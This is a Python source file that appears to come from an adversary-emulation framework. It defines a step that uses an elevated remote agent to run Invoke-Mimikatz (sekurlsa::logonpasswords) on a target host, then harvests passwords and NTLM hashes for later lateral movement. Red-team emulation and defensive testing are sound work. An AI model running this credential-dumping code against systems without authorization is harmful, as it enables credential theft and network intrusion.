from plugins.adversary.app.commands.powershell import PSArg, PSFunction
from plugins.adversary.app.commands.mimikatz import MimikatzCommand, sekurlsa_logonpasswords, mimi_exit, privilege_debug
from plugins.adversary.app.operation.operation import Step, OPUser, OPDomain, OPCredential, OPHost, OPRat, OPVar
from plugins.adversary.app.commands import parsers


class Credentials(Step):
    """
    Description:
        This step utilizes mimikatz to dump the credentials currently stored in memory on a target machine.
    Requirements:
        Requires administrative access to the target machine.
        *NOTE: In order for this action to be useful, the target machines must be seeded with credentials,
        and the appropriate registry keys must be set so that the credentials are held in memory.*
    """
    attack_mapping = [('T1003', 'Credential Access'), ('T1064', 'Defense Evasion'), ('T1064', 'Execution'),
                      ('T1086', 'Execution'), ('T1106', 'Execution')]
    display_name = "get_creds"
    summary = "Use Mimikatz to dump credentials on a specific computer"

    value = 10
    preconditions = [("rat", OPRat({"elevated": True})),
                     ("host", OPHost(OPVar("rat.host")))]
    postconditions = [("domain_g", OPDomain),
                      ("credential_g", OPCredential),
                      ("host_g", OPHost),
                      ("user_g", OPUser)]

    # hacky hint: tells the planner to assume that the credentials are for a user that is local admin on a
    # new host, so that it finds this technique useful
    hints = [("user_g", OPUser({'$in': OPVar('host_g.admins'), "domain": OPVar("domain_g")})),
             ("credential_g", OPCredential({"user": OPVar("user_g")}))]

    preproperties = ["host.os_version.major_version"]

    # host_g.fqdn portproperty is a hack so that planner can use it to laterally move
    postproperties = ["credential_g.password", "user_g.username", "user_g.is_group", "domain_g.windows_domain",
                      "host_g.fqdn"]

    significant_parameters = ["host"]

    cddl = """
    Knowns:
        rat: OPRat[host]
    Effects:
        if not exist rat {
            forget rat
        } elif rat.elevated {
            for cred in rat.host.cached_creds {
                know cred[user[username, is_group, domain[windows_domain], host], password]
            }
        }
    """

    @staticmethod
    def description(host):
        return "Running mimikatz to dump credentials on {}".format(host.fqdn)

    @staticmethod
    async def action(operation, rat, host, domain_g, credential_g, user_g):
        mimikatz_command = MimikatzCommand(privilege_debug(), sekurlsa_logonpasswords(), mimi_exit())

        accounts = await operation.execute_powershell(rat, "powerkatz",
                                                      PSFunction("Invoke-Mimikatz",
                                                                 PSArg("Command", mimikatz_command.command)),
                                                      parsers.mimikatz.sekurlsa_logonpasswords_condensed)

        for account in accounts:
            user_obj = {'username': account['Username'].lower(), 'is_group': False}
            credential_obj = {}
            if 'Password' in account:
                credential_obj['password'] = account['Password']

            if 'NTLM' in account:
                credential_obj["hash"] = account['NTLM']

            # if the domain is not the hostname, this is a Domain account
            if account['Domain'].lower() != host.hostname.lower():
                domain = await domain_g({'windows_domain': account['Domain'].lower()})
                user_obj['domain'] = domain
            else:
                user_obj['host'] = host

            credential_obj['found_on_host'] = host

            user = await user_g(user_obj)
            credential_obj['user'] = user
            await credential_g(credential_obj)

        return True
